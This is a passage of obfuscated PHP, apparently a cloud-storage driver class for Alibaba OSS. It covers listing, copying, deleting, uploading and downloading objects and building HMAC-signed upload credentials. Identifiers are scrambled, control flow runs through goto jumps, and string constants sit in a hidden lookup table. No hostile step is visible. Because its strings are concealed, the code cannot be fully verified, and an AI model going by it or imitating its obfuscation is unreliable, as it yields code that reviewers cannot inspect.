$this->setContent($CÔºŒ±ê‹†, $CÒ ¢¶ˆØ); if ($AÉÙö°÷ !== !1) { return $this->getPathOuter($CÔºŒ±ê‹†); } return !1; } public function mkdir($D®™ˆÖ„è³, $eÇÑÖŒ—Š = REPEAT_SKIP) { if ($this->_isFolder($D®™ˆÖ„è³)) { return $this->getPathOuter($D®™ˆÖ„è³); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($D®™ˆÖ„è³)); } catch (OSS\Core\OssException $D×éÖ©§©) { return !1; } return $this->getPathOuter($D®™ˆÖ„è³); } private function fileList($Dï§²ÖŠàÄ, $e¬œÒÔ„ìí = '', $C—¶ê­ŸÄ² = 0) { goto BÎ÷†ÆÓêó; BÎ÷†ÆÓêó: $B†ø¢›ˆ =& $_SERVER[Ö]; $Dï§²ÖŠàÄ = trim($Dï§²ÖŠàÄ, $B†ø¢›ˆ[8]); $f½›™ÕÙ´ = empty($Dï§²ÖŠàÄ) ? $B†ø¢›ˆ[33] : $Dï§²ÖŠàÄ . $B†ø¢›ˆ[8]; goto AæØ¯”›Ç·; AæØ¯”›Ç·: $d³ÅÅ™­ = $B†ø¢›ˆ[33]; $cÍ’õ‘çŸì = 1000; $AšôµˆœÆ = $fîÆéäõ = array(); goto aÊöÔĞ´µ; aÊöÔĞ´µ: while (!0) { $f‡Ë¯¶Ü = array($B†ø¢›ˆ[1166] => $e¬œÒÔ„ìí, $B†ø¢›ˆ[182] => $f½›™ÕÙ´, $B†ø¢›ˆ[1167] => $cÍ’õ‘çŸì, $B†ø¢›ˆ[1168] => $d³ÅÅ™­); try { $AİÂµ†«›” = $this->client->listObjects($this->bucket, $f‡Ë¯¶Ü); } catch (OSS\Core\OssException $E¬ïãàÓº) { break; } $d³ÅÅ™­ = $AİÂµ†«›”->getNextMarker(); $F¤ø¼£Ö´Õ = $AİÂµ†«›”->getObjectList(); $C°ğÌªÖ¢ñ = $AİÂµ†«›”->getPrefixList(); foreach ($F¤ø¼£Ö´Õ as $B•­…ª‰¸´) { if ($B•­…ª‰¸´->getKey() == $f½›™ÕÙ´) { continue; } $f¿éÃ™§ö = $B•­…ª‰¸´->getKey(); if ($C—¶ê­ŸÄ²) { $f¿éÃ™§ö = array($B†ø¢›ˆ[28] => $f¿éÃ™§ö, $B†ø¢›ˆ[77] => $B•­…ª‰¸´->getSize(), $B†ø¢›ˆ[186] => strtotime($B•­…ª‰¸´->getLastModified())); } $fîÆéäõ[] = $f¿éÃ™§ö; } foreach ($C°ğÌªÖ¢ñ as $ešŞùÀèÁ) { $AšôµˆœÆ[] = $ešŞùÀèÁ->getPrefix(); } if ($d³ÅÅ™­ === $B†ø¢›ˆ[33]) { break; } } return array($B†ø¢›ˆ[74] => $AšôµˆœÆ, $B†ø¢›ˆ[73] => $fîÆéäõ); goto FããÑºß­‚; FããÑºß­‚: } public function copyFile($F™¹áƒÂÌ², $A”ä³¸–ÉØ) { $cì´“†Ú¯­ = $this->size($F™¹áƒÂÌ²); if ($cì´“†Ú¯­ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F™¹áƒÂÌ², $this->bucket, $this->pathEncode($A”ä³¸–ÉØ)); } catch (OSS\Core\OssException $aïÌŸŒ¿Ïæ) { return !1; } return !0; } return $this->multiCopyObject($F™¹áƒÂÌ², $A”ä³¸–ÉØ, $cì´“†Ú¯­); } private function multiCopyObject($féšä¥‚ù, $EªÆ¯Ç, $EŠè¾­Ôˆ£) { $cŸ¬½ˆÌá™ =& $_SERVER[Ö]; try { goto dïµÄ”ëº; BÑôÃÏø‡: $aÙ‹Ì†¿Ä† = 1; $b¼Ìˆ£ª¡» = 0; $bƒ‚ÏåÂ¨ = array(); goto E±íë§†ÀÀ; dïµÄ”ëº: $d¯Ò†£®’Ê = array(); if ($e·Ç‘‹Ê¼Ê = $this->hashMd5($féšä¥‚ù)) { $d¯Ò†£®’Ê = array(OSS\OssClient::OSS_HEADERS => array($cŸ¬½ˆÌá™[1169] => $e·Ç‘‹Ê¼Ê)); } $aºÎÔÍ‚½¥ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EªÆ¯Ç), $d¯Ò†£®’Ê); goto BÑôÃÏø‡; E±íë§†ÀÀ: $A´ÌªÒÄ¸ = 1024 * 1024 * 10; $eİ×§¥ã´¡ = $this->client->generateMultiuploadParts($EŠè¾­Ôˆ£, $A´ÌªÒÄ¸); foreach ($eİ×§¥ã´¡ as $Cô‹Ìµá¢£ => $e‡™ÄÉ°°) { $Aù²Õó˜¬Ã = $b¼Ìˆ£ª¡» + (int) $e‡™ÄÉ°°[$cŸ¬½ˆÌá™[1170]]; $dˆ’ëØ“è = (int) $e‡™ÄÉ°°[$cŸ¬½ˆÌá™[321]] + $Aù²Õó˜¬Ã - 1; $c……Û³Ãø = array($cŸ¬½ˆÌá™[1171] => $Aù²Õó˜¬Ã, $cŸ¬½ˆÌá™[1172] => $dˆ’ëØ“è); $bƒ‚ÏåÂ¨[] = $this->client->uploadPartCopy($this->bucket, $féšä¥‚ù, $this->bucket, $this->pathEncode($EªÆ¯Ç), $aÙ‹Ì†¿Ä†, $aºÎÔÍ‚½¥, $c……Û³Ãø); $aÙ‹Ì†¿Ä† = $aÙ‹Ì†¿Ä† + 1; } goto FŸÃÆæêŠ; FŸÃÆæêŠ: $Få×¡ö‘â¹ = array(); foreach ($bƒ‚ÏåÂ¨ as $Cô‹Ìµá¢£ => $cÇùÀ”ÍÉ) { $Få×¡ö‘â¹[] = array($cŸ¬½ˆÌá™[1173] => $Cô‹Ìµá¢£ + 1, $cŸ¬½ˆÌá™[1174] => $cÇùÀ”ÍÉ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($EªÆ¯Ç), $aºÎÔÍ‚½¥, $Få×¡ö‘â¹); goto FÍÍ…‚éâ¥; FÍÍ…‚éâ¥: } catch (OSS\Core\OssException $BµæÄù‡á ) { return !1; } return !0; } public function moveFile($d¼à‚½³„¢, $C¬Šìê‰àÙ) { if ($this->copyFile($d¼à‚½³„¢, $C¬Šìê‰àÙ)) { $this->remove($d¼à‚½³„¢); return !0; } return !1; } public function delFile($e‰’õã¸Á) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($e‰’õã¸Á)); } catch (OSS\Core\OssException $BÅœŸ¥æ¬Ç) { return !1; } return !0; } public function delFolder($Aè¢Á½¬…) { $DİÆ¾‡‰ =& $_SERVER[Ö]; $D¯—É¼¯’š = $this->fileList($Aè¢Á½¬…); if (!empty($Aè¢Á½¬…) && !in_array(trim($Aè¢Á½¬…, $DİÆ¾‡‰[8]) . $DİÆ¾‡‰[8], $D¯—É¼¯’š[$DİÆ¾‡‰[73]])) { $D¯—É¼¯’š[$DİÆ¾‡‰[73]][] = trim($Aè¢Á½¬…, $DİÆ¾‡‰[8]) . $DİÆ¾‡‰[8]; } foreach (array_chunk($D¯—É¼¯’š[$DİÆ¾‡‰[73]], 1000) as $DŒ‚—¸óË) { try { $this->client->deleteObjects($this->bucket, $DŒ‚—¸óË); } catch (OSS\Core\OssException $D±ïã¾ó‡) { continue; } } return !0; } public function rename($aˆÜ‚Ú“¾ƒ, $dŸ†°Ê‘«) { return $this->renameObject($aˆÜ‚Ú“¾ƒ, $dŸ†°Ê‘«); } private function fileInfo($EŠÓÅëåä, $f³»­ƒ³Å = array()) { goto CÍÕ„²æÚÂ; fö“ïŒñ¢: return $eã‰µùß ; goto Bá—õ²‰; CãÍ›ºœÇ£: if (isset($f³»­ƒ³Å[$FæÔ³— –[77]])) { $eã‰µùß [$FæÔ³— –[77]] = $f³»­ƒ³Å[$FæÔ³— –[77]]; } if (isset($f³»­ƒ³Å[$FæÔ³— –[106]])) { $eã‰µùß [$FæÔ³— –[106]] = $f³»­ƒ³Å[$FæÔ³— –[106]]; } if (isset($f³»­ƒ³Å[$FæÔ³— –[186]]) && !trim($eã‰µùß [$FæÔ³— –[106]])) { $eã‰µùß [$FæÔ³— –[106]] = $f³»­ƒ³Å[$FæÔ³— –[186]]; } goto fö“ïŒñ¢; CÍÕ„²æÚÂ: $FæÔ³— – =& $_SERVER[Ö]; $eã‰µùß  = array($FæÔ³— –[28] => $this->pathThis($EŠÓÅëåä), $FæÔ³— –[75] => $this->getPathOuter($EŠÓÅëåä), $FæÔ³— –[29] => $FæÔ³— –[163], $FæÔ³— –[183] => 0, $FæÔ³— –[106] => 0, $FæÔ³— –[77] => 0, $FæÔ³— –[156] => $this->ext($EŠÓÅëåä), $FæÔ³— –[184] => !0, $FæÔ³— –[185] => !0); if (empty($f³»­ƒ³Å)) { $e…Îæ›‰ğ§ = $this->objectMeta($EŠÓÅëåä); if (!$e…Îæ›‰ğ§) { return $eã‰µùß ; } $f³»­ƒ³Å = array($FæÔ³— –[106] => strtotime($e…Îæ›‰ğ§[$FæÔ³— –[1175]]), $FæÔ³— –[77] => $e…Îæ›‰ğ§[$FæÔ³— –[1176]] + 0); } goto CãÍ›ºœÇ£; Bá—õ²‰: } private function folderInfo($a˜òìãë¿¢, $AÁƒÖŠ¶õ× = array()) { $DÓŠ¸Âİøã =& $_SERVER[Ö]; $bÍÂÅø‡¶˜ = array($DÓŠ¸Âİøã[28] => $this->pathThis($a˜òìãë¿¢), $DÓŠ¸Âİøã[75] => $this->getPathOuter($DÓŠ¸Âİøã[8] . $a˜òìãë¿¢), $DÓŠ¸Âİøã[29] => $DÓŠ¸Âİøã[76], $DÓŠ¸Âİøã[183] => 0, $DÓŠ¸Âİøã[106] => 0, $DÓŠ¸Âİøã[184] => !0, $DÓŠ¸Âİøã[185] => !0); if (empty($AÁƒÖŠ¶õ×)) { $a˜òìãë¿¢ = rtrim($a˜òìãë¿¢, $DÓŠ¸Âİøã[8]) . $DÓŠ¸Âİøã[8]; $dà§ĞÇ¨ = $this->objectMeta($a˜òìãë¿¢); if (!$dà§ĞÇ¨) { return $bÍÂÅø‡¶˜; } $AÁƒÖŠ¶õ× = array($DÓŠ¸Âİøã[183] => $dà§ĞÇ¨[$DÓŠ¸Âİøã[1177]][$DÓŠ¸Âİøã[1178]], $DÓŠ¸Âİøã[106] => strtotime($dà§ĞÇ¨[$DÓŠ¸Âİøã[1175]])); } if (isset($AÁƒÖŠ¶õ×[$DÓŠ¸Âİøã[106]])) { $bÍÂÅø‡¶˜[$DÓŠ¸Âİøã[106]] = $AÁƒÖŠ¶õ×[$DÓŠ¸Âİøã[106]]; } if (isset($AÁƒÖŠ¶õ×[$DÓŠ¸Âİøã[183]])) { $bÍÂÅø‡¶˜[$DÓŠ¸Âİøã[183]] = $AÁƒÖŠ¶õ×[$DÓŠ¸Âİøã[183]]; } return $bÍÂÅø‡¶˜; } public function listPath($cšÁ»òŠ, $A°ğ›ù£Ê = false) { $Dã‰±«¦Ä¥ =& $_SERVER[Ö]; $CïÔª¢ß„ = $this->fileList($cšÁ»òŠ, $Dã‰±«¦Ä¥[8], !0); foreach ($CïÔª¢ß„[$Dã‰±«¦Ä¥[74]] as $bôÔÊÈœåŞ => $DÆâ»”ß£á) { $CïÔª¢ß„[$Dã‰±«¦Ä¥[74]][$bôÔÊÈœåŞ] = $this->folderInfo($DÆâ»”ß£á, $DÆâ»”ß£á); } foreach ($CïÔª¢ß„[$Dã‰±«¦Ä¥[73]] as $bôÔÊÈœåŞ => $DÆâ»”ß£á) { $CïÔª¢ß„[$Dã‰±«¦Ä¥[73]][$bôÔÊÈœåŞ] = $this->fileInfo($DÆâ»”ß£á[$Dã‰±«¦Ä¥[28]], $DÆâ»”ß£á); } return $CïÔª¢ß„; } public function has($d¯ò„®å»â, $CÅ‹¶­”¿ = false, $A…Ë¾§ˆï = true) { goto aÇÉÒŒß®¢; CĞï·­¾ç: $F¢çÊÈ‡å = 0; while (!0) { $D¼ôœ’¥¸ = array($fÅã‹ÙÌ‹[1166] => $fÅã‹ÙÌ‹[8], $fÅã‹ÙÌ‹[182] => $F¦ä«å¯¯Ñ, $fÅã‹ÙÌ‹[1167] => $D¾³‹—Àâ£, $fÅã‹ÙÌ‹[1168] => $CÇ ‚îÀÅ‚); try { $FŒ¹ù¤Ä‹“ = $this->client->listObjects($this->bucket, $D¼ôœ’¥¸); } catch (OSS\Core\OssException $DÂğêÜÉ”‚) { break; } $CÇ ‚îÀÅ‚ = $FŒ¹ù¤Ä‹“->getNextMarker(); $e§ˆÛö±Œ = $FŒ¹ù¤Ä‹“->getObjectList(); $DË„¨™„¦ë = $FŒ¹ù¤Ä‹“->getPrefixList(); if ($CÅ‹¶­”¿) { if (count($e§ˆÛö±Œ) > 1 || count($e§ˆÛö±Œ) == 1 && $e§ˆÛö±Œ[0]->getKey() != $F¦ä«å¯¯Ñ) { $dÍ´®Ø‘Ë± += count($e§ˆÛö±Œ) - 1; } if (!empty($DË„¨™„¦ë)) { $F¢çÊÈ‡å += count($DË„¨™„¦ë); } if ($CÇ ‚îÀÅ‚ === $fÅã‹ÙÌ‹[33]) { break; } continue; } if ($A…Ë¾§ˆï) { if (!empty($e§ˆÛö±Œ)) { if (count($e§ˆÛö±Œ) > 1 || $e§ˆÛö±Œ[0]->getKey() != $F¦ä«å¯¯Ñ) { return !0; } } } else { if (!empty($DË„¨™„¦ë)) { return !0; } } if ($CÇ ‚îÀÅ‚ === $fÅã‹ÙÌ‹[33]) { break; } } if ($CÅ‹¶­”¿) { return array($fÅã‹ÙÌ‹[187] => $dÍ´®Ø‘Ë±, $fÅã‹ÙÌ‹[188] => $F¢çÊÈ‡å); } goto BèŞé‹ƒ†; aÄ›Ìö¾äŒ: $CÇ ‚îÀÅ‚ = $fÅã‹ÙÌ‹[33]; $D¾³‹—Àâ£ = 500; $dÍ´®Ø‘Ë± = 0; goto CĞï·­¾ç; aÇÉÒŒß®¢: $fÅã‹ÙÌ‹ =& $_SERVER[Ö]; $d¯ò„®å»â = trim($d¯ò„®å»â, $fÅã‹ÙÌ‹[8]); $F¦ä«å¯¯Ñ = empty($d¯ò„®å»â) ? $fÅã‹ÙÌ‹[33] : $d¯ò„®å»â . $fÅã‹ÙÌ‹[8]; goto aÄ›Ìö¾äŒ; BèŞé‹ƒ†: return !1; goto DãæÛ’¡Ï; DãæÛ’¡Ï: } public function listAll($bí¦¹¾²Õ†) { $e¡²±¾áÚÒ =& $_SERVER[Ö]; $dÊ¹Ëï©µ = $this->fileList($bí¦¹¾²Õ†, $e¡²±¾áÚÒ[33], !0); $eóƒí’˜ƒ— = array(); foreach ($dÊ¹Ëï©µ[$e¡²±¾áÚÒ[73]] as $E¨Ï†ôğà) { $eóƒí’˜ƒ—[$E¨Ï†ôğà[$e¡²±¾áÚÒ[28]]] = $E¨Ï†ôğà[$e¡²±¾áÚÒ[77]]; } return $this->listAllFiles($bí¦¹¾²Õ†, array_keys($eóƒí’˜ƒ—), $eóƒí’˜ƒ—); } public function canRead($aÒ ‚¥Ğ“ö) { $FŞĞ°¹‚È› =& $_SERVER[Ö]; $E‘±º°Œ› = $this->pathAcl($aÒ ‚¥Ğ“ö); return $E‘±º°Œ› == $FŞĞ°¹‚È›[1179] || $E‘±º°Œ› == $FŞĞ°¹‚È›[487] ? !0 : !1; } public function canWrite($EŒœ’Ü¤Ëè) { $A‡ëäË§Ì = $this->pathAcl($EŒœ’Ü¤Ëè); return $A‡ëäË§Ì == $_SERVER[Ö][487] ? !0 : !1; } public function pathAcl($F—ÓÜ…ÜË£) { goto BÉ»Ó¢Üùæ; B ·­ÓÜ¾: return $e¤§Ê¯ÍÂã; goto d–è´½; AÈÓöëÁ×ã: $e¤§Ê¯ÍÂã = $bö÷ğÉõîí == $A¼–Êæ¼˜Ğ[34] ? $this->bucketAcl : $bö÷ğÉõîí; if ($e¤§Ê¯ÍÂã == $A¼–Êæ¼˜Ğ[1180]) { return $A¼–Êæ¼˜Ğ[1179]; } if ($e¤§Ê¯ÍÂã == $A¼–Êæ¼˜Ğ[1181]) { return $A¼–Êæ¼˜Ğ[487]; } goto B ·­ÓÜ¾; BÉ»Ó¢Üùæ: $A¼–Êæ¼˜Ğ =& $_SERVER[Ö]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bö÷ğÉõîí = $this->client->getObjectAcl($this->bucket, $this->pathEncode($F—ÓÜ…ÜË£)); } catch (OSS\Core\OssException $AÏ·—Á†) { return !1; } goto AÈÓöëÁ×ã; d–è´½: } private function chmodPath($F°°®‡í¸, $dºœñÅ–…ó = '') { $aáÜ³à¾ˆß =& $_SERVER[Ö]; $B³¨ôµÏ™ = empty($dºœñÅ–…ó) ? $aáÜ³à¾ˆß[1181] : $dºœñÅ–…ó; $cŒæ¶ŠôÅ¯ = array($aáÜ³à¾ˆß[34], $aáÜ³à¾ˆß[181], $aáÜ³à¾ˆß[1180], $aáÜ³à¾ˆß[1181]); if (!in_array($B³¨ôµÏ™, $cŒæ¶ŠôÅ¯)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($F°°®‡í¸), $B³¨ôµÏ™); } catch (OSS\Core\OssException $CªõÜ¿›îÏ) { return !1; } return !0; } public function getContent($déŒÔ¨Î¶¢) { return $this->fileSubstr($déŒÔ¨Î¶¢, -1); } public function setContent($díÄçË–Ê, $Dæóï¦¢Ô = '') { $cºõóÂ µ± =& $_SERVER[Ö]; try { $cÆÍğë½« = $this->trafficLimit($cºõóÂ µ±[1182]); $b½µÆÆ«È = $this->client->putObject($this->bucket, $this->pathEncode($díÄçË–Ê), $Dæóï¦¢Ô, $cÆÍğë½«); } catch (OSS\Core\OssException $Dİ÷Â¬„æÍ) { return !1; } $B÷˜Î©´ğ = array($cºõóÂ µ±[1169] => trim($b½µÆÆ«È[$cºõóÂ µ±[1183]], $cºõóÂ µ±[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($díÄçË–Ê))); $this->updateObjMeta($díÄçË–Ê, $B÷˜Î©´ğ); return isset($b½µÆÆ«È[$cºõóÂ µ±[1184]][$cºõóÂ µ±[1131]]) ? (int) $b½µÆÆ«È[$cºõóÂ µ±[1184]][$cºõóÂ µ±[1131]] : strlen($b½µÆÆ«È); } private function updateObjMeta($e™ô­‹ïÇŠ, $Aóêê·‡Šƒ) { $e™ô­‹ïÇŠ = $this->pathEncode($e™ô­‹ïÇŠ); try { $b”š…¿°¾Ğ = array(OSS\OssClient::OSS_HEADERS => $Aóêê·‡Šƒ); $this->client->copyObject($this->bucket, $e™ô­‹ïÇŠ, $this->bucket, $e™ô­‹ïÇŠ, $b”š…¿°¾Ğ); } catch (OSS\Core\OssException $CáïÚÔ×ß) { return !1; } return !0; } public function upload($Fíà½µ“Õœ, $aÁ³¨¯Úª”, $DÆ”Å‰¯Ñ = false, $BïÖÜóè = REPEAT_REPLACE) { $cà¡ÙÔ²Á =& $_SERVER[Ö]; $Bº‡•ÔˆŒÚ = trim($Fíà½µ“Õœ, $cà¡ÙÔ²Á[8]); $DºîŠåõ‚ñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cà¡ÙÔ²Á[1169] => @md5_file($aÁ³¨¯Úª”)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Fíà½µ“Õœ))); $DºîŠåõ‚ñ = $this->trafficLimit($cà¡ÙÔ²Á[1182], $DºîŠåõ‚ñ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Bº‡•ÔˆŒÚ), $aÁ³¨¯Úª”, $DºîŠåõ‚ñ); } catch (OSS\Core\OssException $Aóï£í³„˜) { return !1; } return $this->getPathOuter($Fíà½µ“Õœ); } public function getHost() { $a«œÛ«…¦ˆ =& $_SERVER[Ö]; $dŸÎ¶êëéƒ = explode($a«œÛ«…¦ˆ[167], parent::getHost()); return $dŸÎ¶êëéƒ[0] . $a«œÛ«…¦ˆ[167] . $this->bucket . $a«œÛ«…¦ˆ[91] . $dŸÎ¶êëéƒ[1]; } public function uploadFormData($DöªÉÚçø¥, $A»ªËˆƒ‰¥ = 3600) { goto BË¼¨…¾ê; E›¥ƒä¸í: $d•«æÇŸò = $this->pathFather($DöªÉÚçø¥); $C…¹ò·äè = array($AäÂÍªŸİ™[1088] => $fæò¥»±´, $AäÂÍªŸİ™[1089] => array(array($AäÂÍªŸİ™[1187], 0, $CÚ‹™…ÄÂî), array($AäÂÍªŸİ™[1092], $AäÂÍªŸİ™[1093], $d•«æÇŸò))); $eµ¦¬©ïåÔ = base64_encode(json_encode($C…¹ò·äè)); goto D…ê«¬¹¥„; BË¼¨…¾ê: $AäÂÍªŸİ™ =& $_SERVER[Ö]; if (!($F«òÒÅ‘Îİ = $this->getHost())) { return !1; } $Fñó£øõ£ = $A»ªËˆƒ‰¥; goto fƒàµ×î”ñ; D…ê«¬¹¥„: $cçç´¶É = base64_encode(hash_hmac($AäÂÍªŸİ™[214], $eµ¦¬©ïåÔ, $this->secret, !0)); $Aª¶ÖÓåËº = array($AäÂÍªŸİ™[1098] => $eµ¦¬©ïåÔ, $AäÂÍªŸİ™[1188] => $this->accessKey, $AäÂÍªŸİ™[1094] => $AäÂÍªŸİ™[1086], $AäÂÍªŸİ™[1189] => $cçç´¶É, $AäÂÍªŸİ™[165] => $F«òÒÅ‘Îİ); $Aª¶ÖÓåËº = $this->trafficLimit($AäÂÍªŸİ™[1182], $Aª¶ÖÓåËº); goto DëçÅÚ¥¢‘; D ÅŠ©¯·±: $fæ‰ŒÙ”ºµ = strpos($fæò¥»±´, $AäÂÍªŸİ™[280]); $fæò¥»±´ = substr($fæò¥»±´, 0, $fæ‰ŒÙ”ºµ) . $AäÂÍªŸİ™[1186]; $CÚ‹™…ÄÂî = 1048576000 * 5; goto E›¥ƒä¸í; DëçÅÚ¥¢‘: return $Aª¶ÖÓåËº; goto aŸƒ½çóÏ‰; fƒàµ×î”ñ: $d¬±šÔ²½Í = date($AäÂÍªŸİ™[1185], time() + $Fñó£øõ£); $C·Ìï¶°Âª = new DateTime($d¬±šÔ²½Í); $fæò¥»±´ = $C·Ìï¶°Âª->format(DateTime::ISO8601); goto D ÅŠ©¯·±; aŸƒ½çóÏ‰: } public function multiUploadFormData($F”éŸí™ËÏ, $e¢™× Îµç = 3600) { $EâŸÏ ®…ñ =& $_SERVER[Ö]; if (!($BÕí—ˆ­‘ = $this->getHost())) { return !1; } $D¹‰„Õ±ò• = $this->trafficLimit($EâŸÏ ®…ñ[1182]); $aÇƒÇÙ¢’Ò = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F”éŸí™ËÏ), $D¹‰„Õ±ò•); return array($EâŸÏ ®…ñ[205] => $aÇƒÇÙ¢’Ò, $EâŸÏ ®…ñ[165] => $BÕí—ˆ­‘ . $EâŸÏ ®…ñ[8] . $this->pathEncode($F”éŸí™ËÏ), $EâŸÏ ®…ñ[206] => gmdate($EâŸÏ ®…ñ[1190]), $EâŸÏ ®…ñ[89] => $F”éŸí™ËÏ); } public function multiUploadAuthData($dÍ‹ƒ²ç®¿, $AèÈà˜‰Ã§ = array()) { goto FÍóºˆğ®ô; BâËÎ ÛÏ: $AÜÕÀ¯…Ûè = array($eÈœğòæİÚ[208], $eÈœğòæİÚ[33], $eÈœğòæİÚ[115], $cÓõåÁ“¹÷, "\x78\55\157\x73\x73\x2d\144\x61\164\x65\x3a{$cÓõåÁ“¹÷}", $eÈœğòæİÚ[8] . $this->bucket . $eÈœğòæİÚ[8] . $bÁŞµ²‘ØÙ . $bôÃé‚¸Ì); if (strpos($bôÃé‚¸Ì, $eÈœğòæİÚ[209]) === 0) { $AÜÕÀ¯…Ûè[0] = $eÈœğòæİÚ[210]; if ($Bœ¬¿¸÷Û‘ = $this->trafficLimit($eÈœğòæİÚ[1182])) { $bÁŞµ²‘ØÙ = $eÈœğòæİÚ[1191]; array_splice($AÜÕÀ¯…Ûè, 5, 0, $bÁŞµ²‘ØÙ . $eÈœğòæİÚ[4] . $Bœ¬¿¸÷Û‘[$bÁŞµ²‘ØÙ]); } } if (isset($AèÈà˜‰Ã§[$eÈœğòæİÚ[211]]) && $AèÈà˜‰Ã§[$eÈœğòæİÚ[211]] == $eÈœğòæİÚ[212]) { $AÜÕÀ¯…Ûè[0] = $eÈœğòæİÚ[212]; } goto Bò†œĞ’£¡; FÍóºˆğ®ô: $eÈœğòæİÚ =& $_SERVER[Ö]; $cÓõåÁ“¹÷ = isset($AèÈà˜‰Ã§[$eÈœğòæİÚ[206]]) ? $AèÈà˜‰Ã§[$eÈœğòæİÚ[206]] : gmdate($eÈœğòæİÚ[1190]); $bôÃé‚¸Ì = isset($AèÈà˜‰Ã§[$eÈœğòæİÚ[156]]) ? $AèÈà˜‰Ã§[$eÈœğòæİÚ[156]] : $eÈœğòæİÚ[33]; goto F£î§®Ä Ï; aÊÛÎ‰ë°‹: $c›ŒÕÙÍÁ = $eÈœğòæİÚ[1193] . $this->accessKey . $eÈœğòæİÚ[4] . $c¬Ç—µóèÍ; if (strpos($bôÃé‚¸Ì, $eÈœğòæİÚ[209]) === 0) { $c›ŒÕÙÍÁ = array($eÈœğòæİÚ[216] => $c›ŒÕÙÍÁ, $eÈœğòæİÚ[206] => $cÓõåÁ“¹÷); if ($Bœ¬¿¸÷Û‘) { $c›ŒÕÙÍÁ = array_merge($c›ŒÕÙÍÁ, $Bœ¬¿¸÷Û‘); } } return $c›ŒÕÙÍÁ; goto CëìŠ£ŒãÈ; Bò†œĞ’£¡: if (!empty($AèÈà˜‰Ã§[$eÈœğòæİÚ[1192]])) { $D÷™¡‹ˆ = array_merge(array($AÜÕÀ¯…Ûè[4]), $AèÈà˜‰Ã§[$eÈœğòæİÚ[1192]]); sort($D÷™¡‹ˆ); $AÜÕÀ¯…Ûè[4] = implode($eÈœğòæİÚ[213], $D÷™¡‹ˆ); } $Då™ˆÏß¢Â = implode($eÈœğòæİÚ[213], $AÜÕÀ¯…Ûè); $c¬Ç—µóèÍ = base64_encode(hash_hmac($eÈœğòæİÚ[214], $Då™ˆÏß¢Â, $this->secret, !0)); goto aÊÛÎ‰ë°‹; F£î§®Ä Ï: $bÁŞµ²‘ØÙ = $dÍ‹ƒ²ç®¿; if (isset($AèÈà˜‰Ã§[$eÈœğòæİÚ[89]])) { $bÁŞµ²‘ØÙ = $AèÈà˜‰Ã§[$eÈœğòæİÚ[89]]; unset($AèÈà˜‰Ã§[$eÈœğòæİÚ[89]]); } if (isset($AèÈà˜‰Ã§[$eÈœğòæİÚ[207]])) { $AèÈà˜‰Ã§[$eÈœğòæİÚ[206]] = $cÓõåÁ“¹÷; return $this->listUploadParts($bÁŞµ²‘ØÙ, $AèÈà˜‰Ã§); } goto BâËÎ ÛÏ; CëìŠ£ŒãÈ: } public function listUploadParts($A¦ÂÇŒƒÒ™, $D¶ñâí½”) { goto F²Š«®Ú‚á; Dñë¹•ç®Ê: $eÒ¡Ø§Øå‚ = $F›—»‰„ã->getListPart(); $e‰ÏŠ—éÃ = array(); foreach ($eÒ¡Ø§Øå‚ as $A“”¬©»Š) { $e‰ÏŠ—éÃ[] = array($f¿àå’ËêÙ[1173] => $A“”¬©»Š->getPartNumber(), $f¿àå’ËêÙ[1174] => trim($A“”¬©»Š->getETag(), $f¿àå’ËêÙ[112])); } goto A÷Šİ¼„ç‚; A÷Šİ¼„ç‚: unset($D¶ñâí½”[$f¿àå’ËêÙ[207]], $D¶ñâí½”[$f¿àå’ËêÙ[211]]); $bÜŸ‡çˆÓç = $this->multiUploadAuthData($A¦ÂÇŒƒÒ™, $D¶ñâí½”); if (empty($bÜŸ‡çˆÓç)) { return !1; } goto a¼‹¡é›¤; F²Š«®Ú‚á: $f¿àå’ËêÙ =& $_SERVER[Ö]; $aø¥âºçÕ« = parse_url_query($D¶ñâí½”[$f¿àå’ËêÙ[156]]); $F›—»‰„ã = $this->client->listParts($this->bucket, $this->pathEncode($A¦ÂÇŒƒÒ™), $aø¥âºçÕ«[$f¿àå’ËêÙ[205]]); goto Dñë¹•ç®Ê; a¼‹¡é›¤: return array($f¿àå’ËêÙ[216] => $bÜŸ‡çˆÓç, $f¿àå’ËêÙ[206] => $D¶ñâí½”[$f¿àå’ËêÙ[206]], $f¿àå’ËêÙ[218] => $e‰ÏŠ—éÃ); goto F°ª‰ÀÍ‚’; F°ª‰ÀÍ‚’: } public function download($E»°äÜÃá™, $e“©‡ìŒ”) { if ($this->isFolder($E»°äÜÃá™)) { return !1; } try { $AÇ‚¼àØ„é = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $e“©‡ìŒ”); $AÇ‚¼àØ„é = $this->trafficLimit($_SERVER[Ö][104], $AÇ‚¼àØ„é); $this->client->getObject($this->bucket, $this->pathEncode($E»°äÜÃá™), $AÇ‚¼àØ„é); } catch (OSS\Core\OssException $Dº£Îˆ®çï) { return !1; } return $e“©‡ìŒ”; } public function fileSubstr($BâÇ˜ÛˆÒ, $B—–§åÃ®Š = 0, $eƒ´§…éÅ‡ = false) { if ($B—–§åÃ®Š === -1) { $A¨£æ¤î ã = array(); } else { if ($eƒ´§…éÅ‡ === !1) { $aÅÛŞÂ°Âì = $this->size($BâÇ˜ÛˆÒ); } else { $aÅÛŞÂ°Âì = $B—–§åÃ®Š + $eƒ´§…éÅ‡ - 1; } $A¨£æ¤î ã = array(OSS\OssClient::OSS_RANGE => "{$B—–§åÃ®Š}\x2d{$aÅÛŞÂ°Âì}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($BâÇ˜ÛˆÒ), $A¨£æ¤î ã); } catch (OSS\Core\OssException $BÛêîğŠâŠ) { think_exception($BÛêîğŠâŠ->getMessage()); return !1; } } private function trafficLimit($D‡İàñ¸‰á, $BÛŒŒ’†Â = array()) { goto Eé÷Î°‚õ; DŸß œßÅ: if 